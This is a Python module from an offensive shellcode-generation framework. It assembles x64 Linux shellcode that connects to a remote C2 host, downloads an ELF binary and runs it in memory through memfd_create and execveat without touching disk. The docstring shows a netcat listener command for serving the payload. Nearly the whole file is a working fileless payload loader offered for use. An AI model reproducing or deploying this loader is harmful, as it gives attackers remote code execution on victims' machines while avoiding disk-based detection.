import sys

from sickle.common.lib.reversing.assembler import Assembler
from sickle.common.lib.generic.mparser import argument_check
from sickle.common.lib.generic.convert import port_str_to_htons
from sickle.common.lib.generic.convert import ip_str_to_inet_addr

class Shellcode():

    arch = "x64"

    platform = "linux"

    name = "Linux (x64) TCP Reflective ELF Loader"

    module = f"{platform}/{arch}/memfd_reflective_elf_tcp"

    example_run = f"{sys.argv[0]} -p {module} LHOST=127.0.0.1 LPORT=42 -f c"

    ring = 3

    author = ["wetw0rk"]

    tested_platforms = ["Debian 13.2.0-25"]

    summary = ("TCP-based reflective ELF loader over IPV4 which executes an ELF from"
               " a remote server")

    description = f"""
    TCP based reflective ELF loader over IPV4 that will connect to a remote C2 server
    and download an ELF. Once downloaded, an anonymous file will be created to store
    the ELF file. Upon completion, it will execute in memory without touching disk.

    As an example, your \"C2 Server\" can be as simple as Netcat:

        nc -w 15 -lvp 42 < payload

    Then you can you generate the shellcode accordingly:

        {example_run}

    Upon execution of the shellcode, you should get a connection from the target and
    your ELF should execute in memory.
    """

    arguments = {}

    arguments["LHOST"] = {}
    arguments["LHOST"]["optional"] = "no"
    arguments["LHOST"]["description"] = "Listener host to receive the callback"

    arguments["LPORT"] = {}
    arguments["LPORT"]["optional"] = "yes"
    arguments["LPORT"]["description"] = "Listening port on listener host"

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]
        arg_object["architecture"] = Shellcode.arch

    def get_shellcode(self):
        """Returns bytecode generated by the keystone engine.
        """

        argv_dict = argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        if ("LPORT" not in argv_dict.keys()):
            lport = 4444
        else:
            lport = argv_dict["LPORT"]

        sc_builder = Assembler(Shellcode.arch)

        source_code = (
        """
_start:

create_allocation:
    ; RAX => mmap(void addr[.length], // RDI => Kernel knows whats best, let em decide
    ;             size_t length,      // RSI => Size of initial allocation
    ;             int prot,           // RDX => (PROT_READ | PROT_WRITE)
    ;             int flags,          // R10 => MAP_PRIVATE | MAP_ANONYMOUS)
    ;             int fd,             // R8  => Create anonymous mapping
    ;             off_t offset);      // R9  => Offset
    xor rdi, rdi
    mov rsi, 0x500
    xor rdx, rdx
    add dl, 0x03
    xor r10, r10
    mov r10b, 0x22
    xor r8, r8
    dec r8
    xor r9, r9
    xor rax, rax
    mov al, 0x09
    syscall
    test rax, rax
    je exit
    mov [rsp+0x40], rax

create_sockfd:
    ; RAX => socket(int domain,    // RDI => AF_INET
    ;               int type,      // RSI => SOCK_STREAM
    ;               int protocol); // RDX => IPPROTO_TCP
    mov rdi, 0x02
    mov rsi, 0x01
    mov rdx, 0x06
    mov rax, 0x29
    syscall
    mov [rsp+0x48], rax

connect:
    ; RAX => connect(int sockfd,                  // RDI => sockfd
    ;                const struct sockaddr *addr, // RSI => sockaddr struct
    ;                socklen_t addrlen;           // RDX => sizeof(sockaddr struct)
    mov word ptr [rsp+0x50], 0x02
    mov word ptr [rsp+0x52], {}
    mov dword ptr [rsp+0x54], {}
    mov qword ptr [rsp+0x58], 0x0000000000000000
    mov rdi, [rsp+0x48]
    mov rsi, rsp
    add rsi, 0x50
    mov rdx, 0x10
    mov rax, 0x2a
    syscall

init_download:
    ; RAX = write(int fd,                 // RAX => sockfd
    ;             const void buf[.count], // RSI => strlen(msg)
    ;             size_t count);          // RDX => msg
    mov rdi, [rsp+0x48]
    mov dword ptr [rsp+0x60], 0x41414141
    mov dword ptr [rsp+0x64], 0x00000000
    mov rsi, rsp
    add rsi, 0x60
    mov rdx, 0x04
    mov rax, 0x1
    syscall

set_index:
    xor r14, r14

download_stager:
    mov r9, 0x80

    ; RAX => read(int fd,        // RDI => sockfd
    ;             void *buf      // RSI => Anywhere on the stack
    ;             size_t count); // RDX => 0x500
    mov rdi, [rsp+0x48]
    mov rsi, rsp
    add rsi, r9
    mov rdx, 0x500
    mov rax, 0x00
    syscall

    test rax, rax
    jz download_complete

adjust_allocation:
    mov r15, [rsp+0x40]
    mov r12, rax

write_data:
    mov r10b, [rsp+r9]
    mov [r15+r14], r10b
    inc r14
    inc r9
    dec rax
    test rax, rax
    jnz write_data

check_size:
    cmp r12, 0x00
    je download_complete    

realloc:
    ; RAX => mremap(void old_address,    // RDI => *last_alloc
    ;               size_t old_size,     // RSI => sizeof(last_alloc)
    ;               size_t new_size,     // RDX => sizeof(new_alloc)
    ;               int flags,           // R10 => MREMAP_MAYMOVE
    ;               void *new_address);  // R8  => &out
    mov rdi, [rsp+0x40]
    mov rsi, r14
    mov r13, r14
    add r13, 0x500
    mov rdx, r13
    mov r10, 0x01
    mov r8, rsp
    mov rax, 0x19
    syscall

    mov [rsp+0x40], rax

    jmp download_stager

download_complete:
    mov [rsp+0x30], r14

create_memory_file:
    ; RAX => memfd_create(const char *name,    // RDI => *buffer
    ;                     unsigned int flags); // RSI => MFD_CLOEXEC (0x01)
    mov r9, rsp
    add r9, 0x80
    xor rax, rax
    mov [r9], rax
    mov dword ptr [r9], 0x41414141
    mov rdi, r9
    mov rsi, 0x01
    mov rax, 0x13f
    syscall
    mov [rsp+0x80], rax

write_to_file:
    ; RAX = write(int fd,                  // RDI => fd
    ;             const void buf[.count],  // RSI => *elf
    ;             size_t count);           // RDX => sizeof(elf)
    mov rdi, [rsp+0x80]
    mov rsi, [rsp+0x40]
    mov rdx, [rsp+0x30]
    mov rax, 0x1
    syscall

execute_elf:
    ; RAX = execveat(int dirfd,                     // RDI => File descriptor of anonymous mapping
    ;                const char *pathname,          // RSI => Empty string
    ;                char *const _Nullable argv[],  // RDX => []
    ;                char *const _Nullable envp[],  // R10 => *addr
    ;                int flags);                    // R8  => AT_EMPTY_PATH

    mov rdi, [rsp+0x80]
    xor rax,rax
    xor rax,rax
    mov rsi, rsp
    add rsi, 0x80
    mov [rsi], rax
    mov byte ptr [rsi], 0x20
    mov r8, 0x1000
    xor rax,rax
    mov [r9], rax
    mov rdx, r9
    mov [rsp], rax
    mov r10, rsp
    mov rax, 0x142
    syscall

exit:
    xor rax, rax
    ret
        """
        ).format(hex(port_str_to_htons(lport)),
                 hex(ip_str_to_inet_addr(argv_dict["LHOST"])))


        return sc_builder.get_bytes_from_asm(source_code)
